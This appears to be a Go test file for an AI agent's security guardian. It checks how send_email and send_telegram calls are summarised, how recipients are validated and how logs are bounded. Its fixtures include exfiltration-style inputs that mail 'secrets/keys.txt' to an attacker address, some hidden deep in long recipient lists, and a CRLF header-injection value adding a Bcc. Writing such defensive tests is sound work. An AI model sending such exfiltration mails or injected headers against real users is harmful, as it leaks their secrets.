package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"testing"
	"unicode/utf8"

	"aurago/internal/security"
	"aurago/internal/tools"

	openai "github.com/sashabaranov/go-openai"
)

// Follow-up tests for task 1c-06 (review round): what the LLM Guardian sees of send_email and
// send_telegram, the file-only Telegram precheck, recipients checked before attachments are
// read, and the log lines. Helpers carry the prefix c06 and are shared with
// flow_tool_extensions_hardening_test.go.

// c06GuardianParams runs a native tool call through the same two steps the dispatch does
// before it asks the LLM Guardian.
func c06GuardianParams(t *testing.T, tool, arguments string) map[string]string {
	t.Helper()
	tc := NativeToolCallToToolCall(openai.ToolCall{ID: "c06", Function: openai.FunctionCall{Name: tool, Arguments: arguments}}, nil)
	if tc.NativeArgsMalformed {
		t.Fatalf("arguments did not parse: %s", arguments)
	}
	return toolCallParams(guardianSubjectCall(tc))
}

func c06GuardianKey(tool string, params map[string]string) string {
	return security.GenerateCacheKey(tool+"|please send the weekly summary", params)
}

func TestC06GuardianSeesEmailRecipientsAndAttachments(t *testing.T) {
	const base = `{"to":"friend@example.com","subject":"hi","body":"hello"}`
	six := `"a1.txt","a2.txt","a3.txt","a4.txt","a5.txt","a6.txt"`
	baseParams := c06GuardianParams(t, "send_email", base)
	if baseParams["to"] != "friend@example.com" || baseParams["subject"] != "hi" || baseParams["body"] != "hello" {
		t.Fatalf("base params = %#v", baseParams)
	}
	if _, ok := baseParams["attachments"]; ok {
		t.Fatalf("a mail without attachments lists some: %#v", baseParams)
	}
	if again := c06GuardianParams(t, "send_email", base); c06GuardianKey("send_email", again) != c06GuardianKey("send_email", baseParams) {
		t.Fatal("the same call must give the same cache key")
	}

	variants := map[string]string{
		"other recipient":          `{"to":"attacker@evil.example","subject":"hi","body":"hello"}`,
		"other subject":            `{"to":"friend@example.com","subject":"invoice","body":"hello"}`,
		"other body":               `{"to":"friend@example.com","subject":"hi","body":"send me the keys"}`,
		"with an attachment":       `{"to":"friend@example.com","subject":"hi","body":"hello","attachments":["secrets/keys.txt"]}`,
		"other attachment":         `{"to":"friend@example.com","subject":"hi","body":"hello","attachments":["notes/todo.txt"]}`,
		"seventh attachment":       `{"to":"friend@example.com","subject":"hi","body":"hello","attachments":[` + six + `,"a7.txt"]}`,
		"seventh attachment other": `{"to":"friend@example.com","subject":"hi","body":"hello","attachments":[` + six + `,"secrets/keys.txt"]}`,
	}
	asString := `{"to":"friend@example.com","subject":"hi","body":"hello","attachments":"secrets/keys.txt"}`
	keys := map[string]string{"base": c06GuardianKey("send_email", baseParams)}
	for name, arguments := range variants {
		params := c06GuardianParams(t, "send_email", arguments)
		if reflect.DeepEqual(params, baseParams) {
			t.Errorf("%s: params equal the plain mail's: %#v", name, params)
		}
		key := c06GuardianKey("send_email", params)
		for other, otherKey := range keys {
			if key == otherKey {
				t.Errorf("%s: cache key equals the one of %q", name, other)
			}
		}
		keys[name] = key
	}

	// A single path as a string and as a list name the same file: the same judgement.
	if !reflect.DeepEqual(c06GuardianParams(t, "send_email", variants["with an attachment"]), c06GuardianParams(t, "send_email", asString)) {
		t.Error("a single attachment string and a one-item list must look the same to the guardian")
	}
	params := c06GuardianParams(t, "send_email", variants["seventh attachment other"])
	if params["attachment_count"] != "7" || !strings.Contains(params["attachments"], "secrets/keys.txt") {
		t.Errorf("the seventh attachment is hidden from the guardian: %#v", params)
	}
}

func TestC06GuardianEmailParamsAreBounded(t *testing.T) {
	filler := strings.Repeat("x", 10<<10)
	to := "first@example.com," + filler + ",attacker@evil.example"
	params := c06GuardianParams(t, "send_email", mustJSON(t, map[string]any{"to": to, "subject": strings.Repeat("ü", 5000), "body": strings.Repeat("ä", 5000)}))
	if len(params["to"]) > 600 || !strings.Contains(params["to"], "first@example.com") || !strings.HasSuffix(params["to"], "attacker@evil.example") {
		t.Errorf("to: %d bytes, %.60q … %.40q", len(params["to"]), params["to"], params["to"][max(0, len(params["to"])-40):])
	}
	if len(params["subject"]) > 200 || len(params["body"]) > 300 {
		t.Errorf("subject %d bytes, body %d bytes", len(params["subject"]), len(params["body"]))
	}
	for key, value := range params {
		if !utf8.ValidString(value) {
			t.Errorf("%s is cut inside a character: %q", key, value)
		}
	}

	// Ten long paths: every one keeps its head and its tail, and the whole stays bounded.
	paths := make([]string, 10)
	for i := range paths {
		paths[i] = fmt.Sprintf("dir-%02d/%s/file-%02d.txt", i, strings.Repeat("ö", 400), i)
	}
	params = c06GuardianParams(t, "send_email", mustJSON(t, map[string]any{"to": "a@example.com", "attachments": paths}))
	list := params["attachments"]
	if len(list) > 600 || !utf8.ValidString(list) {
		t.Fatalf("attachments: %d bytes, valid UTF-8 %v", len(list), utf8.ValidString(list))
	}
	for i := range paths {
		if !strings.Contains(list, fmt.Sprintf("dir-%02d/", i)) || !strings.Contains(list, fmt.Sprintf("file-%02d.txt", i)) {
			t.Errorf("attachment %d lost its head or tail in %q", i, list)
		}
	}

	// More than ten: ten are listed, the count tells the rest.
	many := make([]string, 12)
	for i := range many {
		many[i] = fmt.Sprintf("f%02d.txt", i)
	}
	params = c06GuardianParams(t, "send_email", mustJSON(t, map[string]any{"to": "a@example.com", "attachments": many}))
	if params["attachment_count"] != "12" || !strings.Contains(params["attachments"], "f09.txt") || strings.Contains(params["attachments"], "f10.txt") {
		t.Errorf("12 attachments: %#v", params)
	}
}

func TestC06GuardianSeesEveryRecipientOfALongList(t *testing.T) {
	recipients := make([]string, 12)
	for i := range recipients {
		recipients[i] = fmt.Sprintf("recipient-%02d@example.org", i+1)
	}
	harmless := strings.Join(recipients, ", ")
	recipients[6] = "attacker@evil.example" // seventh place
	attacked := strings.Join(recipients, ", ")

	params := c06GuardianParams(t, "send_email", mustJSON(t, map[string]any{"to": attacked}))
	if params["to"] != attacked || params["recipient_count"] != "12" {
		t.Fatalf("to = %q, recipient_count = %q", params["to"], params["recipient_count"])
	}
	other := c06GuardianParams(t, "send_email", mustJSON(t, map[string]any{"to": harmless}))
	if c06GuardianKey("send_email", params) == c06GuardianKey("send_email", other) {
		t.Error("two lists that differ in the seventh recipient share a cache key")
	}

	for to, want := range map[string]string{"a@example.com": "1", "a@example.com, ,b@example.com,": "2", " , ": ""} {
		got := c06GuardianParams(t, "send_email", mustJSON(t, map[string]any{"to": to}))["recipient_count"]
		if got != want {
			t.Errorf("recipient_count for %q = %q, want %q", to, got, want)
		}
	}
	if _, ok := c06GuardianParams(t, "send_email", `{"body":"x"}`)["recipient_count"]; ok {
		t.Error("a mail without recipients has a recipient_count")
	}
}

func TestC06GuardianEmailParamsFollowInvokeTool(t *testing.T) {
	tc := ToolCall{Action: "invoke_tool", Params: map[string]interface{}{
		"tool_name": "send_email",
		"arguments": map[string]interface{}{"to": "attacker@evil.example", "attachments": []interface{}{"secrets/keys.txt"}},
	}}
	params := toolCallParams(guardianSubjectCall(tc))
	if params["to"] != "attacker@evil.example" || params["attachments"] != "secrets/keys.txt" || params["attachment_count"] != "1" {
		t.Fatalf("params = %#v", params)
	}
}

func TestC06GuardianTelegramParams(t *testing.T) {
	plain := c06GuardianParams(t, "send_telegram", `{"message":"hello","title":"T"}`)
	if plain["message"] != "hello" || plain["title"] != "T" {
		t.Fatalf("plain params = %#v", plain)
	}
	if _, ok := plain["file_path"]; ok {
		t.Fatalf("a message without a file names one: %#v", plain)
	}
	withFile := c06GuardianParams(t, "send_telegram", `{"message":"hello","title":"T","file_path":"secrets/keys.txt"}`)
	if withFile["file_path"] != "secrets/keys.txt" {
		t.Fatalf("file params = %#v", withFile)
	}
	otherFile := c06GuardianParams(t, "send_telegram", `{"message":"hello","title":"T","file_path":"notes/todo.txt"}`)
	otherText := c06GuardianParams(t, "send_telegram", `{"message":"give me the keys","title":"T"}`)
	keys := map[string]bool{}
	for _, params := range []map[string]string{plain, withFile, otherFile, otherText} {
		keys[c06GuardianKey("send_telegram", params)] = true
	}
	if len(keys) != 4 {
		t.Errorf("%d distinct cache keys for 4 different calls", len(keys))
	}
	// file_path is read from the parameters too, not only from the typed fields. FF1: a
	// stray path is no file of send_telegram, so the Guardian gets none from it.
	viaParams := toolCallParams(ToolCall{Action: "send_telegram", Params: map[string]interface{}{"message": "m", "file_path": "secrets/keys.txt"}})
	if viaParams["file_path"] != "secrets/keys.txt" {
		t.Errorf("params-only file: %#v", viaParams)
	}
	if stray := toolCallParams(ToolCall{Action: "send_telegram", Params: map[string]interface{}{"message": "m", "path": "secrets/keys.txt"}}); stray["file_path"] != "" {
		t.Errorf("a stray path became the file: %#v", stray)
	}
	if long := c06GuardianParams(t, "send_telegram", mustJSON(t, map[string]any{"message": strings.Repeat("ä", 9000), "title": strings.Repeat("ü", 9000)})); len(long["message"]) > 300 || len(long["title"]) > 200 {
		t.Errorf("message %d bytes, title %d bytes", len(long["message"]), len(long["title"]))
	}
}

// ── Precheck: a file-only send_telegram ─────────────────────────────────────

func TestC06PrecheckLetsAFileOnlyTelegramThrough(t *testing.T) {
	chat, chatSession := RunConfig{MessageSource: "web_chat"}, "default"
	heartbeat, heartbeatSession := RunConfig{MessageSource: "heartbeat"}, "heartbeat"
	for name, tc := range map[string]struct {
		call        ToolCall
		blocked     bool
		wantMessage string
	}{
		"file_path param":  {call: ToolCall{IsTool: true, Action: "send_telegram", Params: map[string]interface{}{"file_path": "a.pdf"}}},
		"typed FilePath":   {call: ToolCall{IsTool: true, Action: "send_telegram", FilePath: "a.pdf"}},
		"file and message": {call: ToolCall{IsTool: true, Action: "send_telegram", Params: map[string]interface{}{"file_path": "a.pdf", "message": "m"}}},
		"blank file":       {call: ToolCall{IsTool: true, Action: "send_telegram", Params: map[string]interface{}{"file_path": "  "}}, blocked: true, wantMessage: "message is required"},
		"nothing":          {call: ToolCall{IsTool: true, Action: "send_telegram"}, blocked: true, wantMessage: "message is required"},
		"message only":     {call: ToolCall{IsTool: true, Action: "send_telegram", Params: map[string]interface{}{"message": "m"}}},
	} {
		out, blocked := precheckMessagingToolArgs(tc.call, chat, chatSession)
		if blocked != tc.blocked || (tc.blocked && !strings.Contains(out, tc.wantMessage)) {
			t.Errorf("chat %s: blocked=%v out=%s", name, blocked, out)
		}
		out, blocked = precheckMessagingToolArgs(tc.call, heartbeat, heartbeatSession)
		if blocked != tc.blocked || (tc.blocked && !strings.Contains(out, "skipped")) {
			t.Errorf("heartbeat %s: blocked=%v out=%s", name, blocked, out)
		}
	}
}

func TestC06SendTelegramFileOnlyHasNoCaption(t *testing.T) {
	bot := c06FakeBot(t)
	cfg, workspace := c06TelegramConfig(t)
	c06WriteFile(t, workspace, "c06-only.pdf", "%PDF-1.4 only")
	out := c06SendTelegram(cfg, map[string]interface{}{"file_path": "c06-only.pdf"})
	if c06Result(t, out)["status"] != "success" {
		t.Fatalf("output = %s", out)
	}
	requests := bot.all()
	if len(requests) != 1 || requests[0].Path != "/bot123:abc/sendDocument" || requests[0].Filename != "c06-only.pdf" {
		t.Fatalf("requests = %+v", requests)
	}
	if caption, ok := requests[0].Fields["caption"]; ok {
		t.Fatalf("a file without text got the caption %q", caption)
	}
}

// ── Recipients are checked before any attachment is read ────────────────────

func TestC06SendEmailRefusesABadRecipientBeforeReadingAttachments(t *testing.T) {
	srv := c06StartSMTP(t)
	cfg := c06EmailConfig(t, srv, nil)
	if err := os.WriteFile(filepath.Join(cfg.Directories.WorkspaceDir, "c06-big.bin"), make([]byte, 5<<20), 0o600); err != nil {
		t.Fatal(err)
	}
	allocated := func(to string) (string, uint64) {
		var before, after runtime.MemStats
		runtime.ReadMemStats(&before)
		out := c06SendEmail(t, cfg, nil, map[string]interface{}{"to": to, "attachments": []interface{}{"c06-big.bin"}})
		runtime.ReadMemStats(&after)
		return out, after.TotalAlloc - before.TotalAlloc
	}

	for name, tc := range map[string]struct{ to, want string }{
		"line break":   {"a@example.com\r\nBcc: x@evil.example", "line break or a NUL"},
		"NUL":          {"a@example.com\x00", "line break or a NUL"},
		"empty entry":  {"a@example.com,", "empty entry"},
		"only a comma": {",", "empty entry"},
	} {
		out, n := allocated(tc.to)
		msg := c06Message(t, out)
		if c06Result(t, out)["status"] != "error" || !strings.Contains(msg, tc.want) || strings.Contains(msg, "SMTP send failed") {
			t.Errorf("%s: output = %s", name, out)
		}
		if n > 1<<20 {
			t.Errorf("%s: %d bytes allocated, the 5 MB attachment was read before the recipient was refused", name, n)
		}
	}
	if n := srv.conns.Load(); n != 0 {
		t.Fatalf("%d SMTP connections for refused recipients", n)
	}

	// Control: with a valid recipient the same call does read the file, so the bound above
	// measures something.
	if _, n := allocated("a@example.com"); n < 5<<20 {
		t.Fatalf("a valid recipient allocated only %d bytes; the measurement does not see the attachment read", n)
	}
}

func TestC06CheckEmailRecipients(t *testing.T) {
	for to, ok := range map[string]bool{
		"a@example.com":                true,
		"a@example.com, b@example.com": true,
		"a@example.com\n":              false,
		"a@example.com\rb@x":           false,
		"a@example.com\x00":            false,
		"a@example.com,,b@example.com": false,
		"":                             false,
		" ":                            false,
	} {
		if err := tools.CheckEmailRecipients(to); (err == nil) != ok {
			t.Errorf("CheckEmailRecipients(%q) = %v, want ok=%v", to, err, ok)
		}
	}
}

// ── Log lines ───────────────────────────────────────────────────────────────

// c06LogRecords decodes the JSON log lines of buf.
func c06LogRecords(t *testing.T, buf *bytes.Buffer) []map[string]any {
	t.Helper()
	var records []map[string]any
	for _, line := range strings.Split(strings.TrimSpace(buf.String()), "\n") {
		if line == "" {
			continue
		}
		var record map[string]any
		if err := json.Unmarshal([]byte(line), &record); err != nil {
			t.Fatalf("log line is not JSON: %q", line)
		}
		records = append(records, record)
	}
	return records
}

func c06FindLog(t *testing.T, records []map[string]any, msg string) map[string]any {
	t.Helper()
	for _, record := range records {
		if record["msg"] == msg {
			return record
		}
	}
	t.Fatalf("no %q log line in %v", msg, records)
	return nil
}

func TestC06SendTelegramLogsBoundTheTitleAndNameTheDocument(t *testing.T) {
	c06FakeBot(t)
	cfg, workspace := c06TelegramConfig(t)
	c06WriteFile(t, workspace, "c06-bericht.pdf", "%PDF-1.4 c06")
	var logs bytes.Buffer
	logger := slog.New(slog.NewJSONHandler(&logs, nil))
	title := strings.Repeat("ä", 5000)

	for name, params := range map[string]map[string]interface{}{
		"message":  {"message": "m", "title": title},
		"document": {"message": "m", "title": title, "file_path": "c06-bericht.pdf"},
	} {
		logs.Reset()
		out, _ := dispatchMessagingCases(context.Background(), ToolCall{Action: "send_telegram", Params: params}, &DispatchContext{Cfg: cfg, Logger: logger})
		if c06Result(t, out)["status"] != "success" {
			t.Fatalf("%s: output = %s", name, out)
		}
		records := c06LogRecords(t, &logs)
		request := c06FindLog(t, records, "LLM requested telegram "+name)
		if got, _ := request["title"].(string); utf8.RuneCountInString(got) > logTextRunes+1 || got == "" {
			t.Errorf("%s: title log has %d runes", name, utf8.RuneCountInString(got))
		}
		if name == "document" {
			sent := c06FindLog(t, records, "Telegram document sent")
			if sent["file"] != "c06-bericht.pdf" {
				t.Errorf("document log = %v", sent)
			}
		}
	}
}

func TestC06LogTelegramDocumentSent(t *testing.T) {
	var logs bytes.Buffer
	logger := slog.New(slog.NewJSONHandler(&logs, nil))
	long := strings.Repeat("ö", 1000) + ".pdf"

	logTelegramDocumentSent(logger, `{"status":"error","message":"x","document":"a.pdf"}`)
	logTelegramDocumentSent(logger, `not json`)
	logTelegramDocumentSent(logger, `{"status":"success"}`)
	if logs.Len() != 0 {
		t.Fatalf("a failure or an unnamed document was logged: %s", logs.String())
	}
	logTelegramDocumentSent(logger, mustJSON(t, map[string]any{"status": "success", "document": long}))
	got, _ := c06FindLog(t, c06LogRecords(t, &logs), "Telegram document sent")["file"].(string)
	if n := utf8.RuneCountInString(got); n != logTextRunes+1 || !strings.HasSuffix(got, "…") {
		t.Fatalf("file log has %d runes: %.40q", n, got)
	}
}

func TestC06EmailSentResultNamesTheAttachments(t *testing.T) {
	var logs bytes.Buffer
	logger := slog.New(slog.NewJSONHandler(&logs, nil))

	plain := emailSentResult(logger, "main", "a@example.com", nil)
	if c06Message(t, plain) != "Email sent to a@example.com via account main" || logs.Len() != 0 {
		t.Fatalf("plain mail: %s, log %q", plain, logs.String())
	}

	files := make([]tools.EmailAttachment, 8)
	for i := range files {
		files[i] = tools.EmailAttachment{Name: fmt.Sprintf("file-%d.pdf", i)}
	}
	files[0].Name = strings.Repeat("ß", 1000)
	out := emailSentResult(logger, "main", "a@example.com", files)
	if c06Result(t, out)["status"] != "success" || c06Message(t, out) != "Email sent to a@example.com via account main with 8 attachment(s)" {
		t.Fatalf("result = %s", out)
	}
	record := c06FindLog(t, c06LogRecords(t, &logs), "send_email delivered")
	names, _ := record["files"].(string)
	if record["attachments"] != float64(8) || !strings.Contains(names, "file-5.pdf") || strings.Contains(names, "file-6.pdf") || !strings.HasSuffix(names, "+2 more") {
		t.Fatalf("log = %v", record)
	}
	if utf8.RuneCountInString(names) > logTextRunes+1+5*len(", file-1.pdf")+len(", +2 more") {
		t.Fatalf("names are not bounded: %d runes", utf8.RuneCountInString(names))
	}
}
